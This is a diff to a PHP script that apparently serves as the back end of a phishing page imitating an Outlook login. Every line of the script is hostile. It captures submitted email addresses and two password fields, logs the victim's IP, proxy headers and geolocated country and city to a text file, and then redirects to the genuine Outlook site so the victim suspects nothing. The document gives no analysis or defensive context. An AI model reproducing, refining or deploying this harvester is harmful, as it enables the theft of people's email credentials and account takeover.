@@ -1,19 +1,36 @@
-
 <?php
 
 date_default_timezone_set('America/Caracas');
 ini_set("display_errors", 0);
-$userp = $_SERVER['REMOTE_ADDR'];
+$ip = $_SERVER['REMOTE_ADDR'];
+$ip_comp = $_SERVER['HTTP_CLIENT_IP'];
+$userp = $_SERVER['HTTP_X_FORWARDED'];
+$proxy = $_SERVER['HTTP_X_FORWARDED_FOR'];
 
-$cc = trim(file_get_contents("http://ipinfo.io/{$userp}/country"));
-$city = trim(file_get_contents("http://ipinfo.io/{$userp}/city"));
+
+
+$cc = trim(file_get_contents("http://ipinfo.io/{$proxy}/country"));
+$city = trim(file_get_contents("http://ipinfo.io/{$proxy}/city"));
+
+
 	
 	$file = fopen("envio.txt", "a");
 	
-fwrite($file, "".$_POST['email']." | ".$_POST['pass']." | ".$_POST['pass1']." | ".date('Y-m-d')." | ".date('H:i:s')." | ".$userp." ".$cc." ".$city."  " . PHP_EOL);
-fwrite($file, "----------------------------------------- " . PHP_EOL);
+fwrite($file, 
+"* EMAIL: ".$_POST['email']."
+* PASS: ".$_POST['pass']."
+* PASS1: ".$_POST['pass1']."
+* FECHA: ".date('Y-m-d')."
+* HORA: ".date('H:i:s')."
+* IP: ".$ip."
+* PROXY: ".$proxy."
+* IP COMPARTIDA: ".$ip_comp."
+".$userp."
+".$cc."
+".$city."   
+" . PHP_EOL);
+fwrite($file, "==============================" . PHP_EOL);
 fclose($file);
-
 
 header("location:https://outlook.live.com/owa/");
 
